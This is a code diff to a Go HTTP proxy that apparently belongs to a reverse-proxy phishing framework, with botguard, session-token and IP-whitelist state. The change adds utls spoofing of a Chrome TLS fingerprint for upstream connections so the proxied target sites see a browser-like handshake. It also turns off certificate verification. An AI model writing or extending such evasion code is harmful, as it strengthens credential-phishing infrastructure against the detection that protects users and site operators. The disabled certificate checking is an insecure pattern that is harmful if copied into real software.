@@ -10,11 +10,13 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"context"
 	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/subtle"
 	"crypto/tls"
+	utls "github.com/refraction-networking/utls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -93,6 +95,7 @@ type HttpProxy struct {
 	bg_ja4            []string
 	bgStateMap        map[string]*bgSessionState
 	bg_tokens         map[string]string
+	upstreamDial      func(network, addr string) (net.Conn, error)
 	bg_mtx            sync.Mutex
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
@@ -156,6 +159,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
 		}
 	}
+	// wire the upstream path even when the proxy is off — the TLS fingerprint
+	// spoofing (proxyConfig.TLSFingerprint) applies to direct upstream too
+	p.applyTransport()
 
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
 	p.botguard = false
@@ -163,6 +169,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.bg_fp = make(map[string]*bgFPEntry)
 	p.bgStateMap = make(map[string]*bgSessionState)
 	p.bg_tokens = make(map[string]string)
+	p.upstreamDial = (&net.Dialer{Timeout: 30 * time.Second}).Dial
 	p.bg_grace = 8
 	p.bg_no_ua = false
 	p.wh_sent = make(map[string]bool)
@@ -2108,8 +2115,7 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 		}
 		direct := (&net.Dialer{Timeout: 30 * time.Second}).Dial
 		if len(routes) == 0 {
-			p.Proxy.Tr.Dial = pdial
-			p.Proxy.ConnectDial = pdial
+			p.upstreamDial = pdial
 			log.Info("proxy: ALL upstream traffic routed via %s://%s:%d", ptype, address, port)
 		} else {
 			sel := func(network, addr string) (net.Conn, error) {
@@ -2121,15 +2127,68 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 				}
 				return direct(network, addr)
 			}
-			p.Proxy.Tr.Dial = sel
-			p.Proxy.ConnectDial = sel
+			p.upstreamDial = sel
 			log.Info("proxy: %d domain suffix(es) routed via %s://%s:%d, rest direct", len(routes), ptype, address, port)
 		}
 	} else {
-		p.Proxy.Tr.Dial = nil
-		p.Proxy.ConnectDial = nil
+		p.upstreamDial = (&net.Dialer{Timeout: 30 * time.Second}).Dial
 	}
+	p.applyTransport()
 	return nil
+}
+
+// applyTransport wires the upstream dial path (proxy selector or direct) plus
+// the optional utls TLS-fingerprint spoofing into the outbound transport.
+// Called after every proxy/tlsfp change; safe to call repeatedly.
+func (p *HttpProxy) applyTransport() {
+	tr := p.Proxy.Tr
+	tr.Dial = p.upstreamDial
+	fp := ""
+	if p.cfg.proxyConfig != nil {
+		fp = p.cfg.proxyConfig.TLSFingerprint
+	}
+	if fp == "" {
+		tr.DialTLSContext = nil
+		return
+	}
+	tr.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+		raw, err := p.upstreamDial(network, addr)
+		if err != nil {
+			return nil, err
+		}
+		host, _, serr := net.SplitHostPort(addr)
+		if serr != nil {
+			host = addr
+		}
+		// ALPN http/1.1 only: Go's transport cannot speak h2 over a non-standard
+		// TLS conn (it type-asserts *tls.Conn), and an h2-negotiated conn carrying
+		// http/1.1 breaks every request. JA3 does not include ALPN, so the
+		// Chrome ClientHello fingerprint still matches on JA3. Clone the Chrome
+		// spec via the patched IdToSpec wrapper and force ALPN http/1.1 in it
+		// (the Chrome preset ships h2 first, which breaks here).
+		spec, err := utls.IdToSpec(utls.HelloChrome_106_Shuffle)
+		if err != nil {
+			return nil, err
+		}
+		for _, ext := range spec.Extensions {
+			if alpn, ok := ext.(*utls.ALPNExtension); ok {
+				alpn.AlpnProtocols = []string{"http/1.1"}
+			}
+		}
+		uc := utls.UClient(raw, &utls.Config{
+			ServerName:         host,
+			NextProtos:         []string{"http/1.1"},
+			InsecureSkipVerify: true,
+		}, utls.HelloCustom)
+		if err := uc.ApplyPreset(&spec); err != nil {
+			return nil, err
+		}
+		if err := uc.HandshakeContext(ctx); err != nil {
+			return nil, err
+		}
+		return uc, nil
+	}
+	log.Info("proxy: upstream TLS fingerprint spoofing enabled (%s)", fp)
 }
 
 type dumbResponseWriter struct {
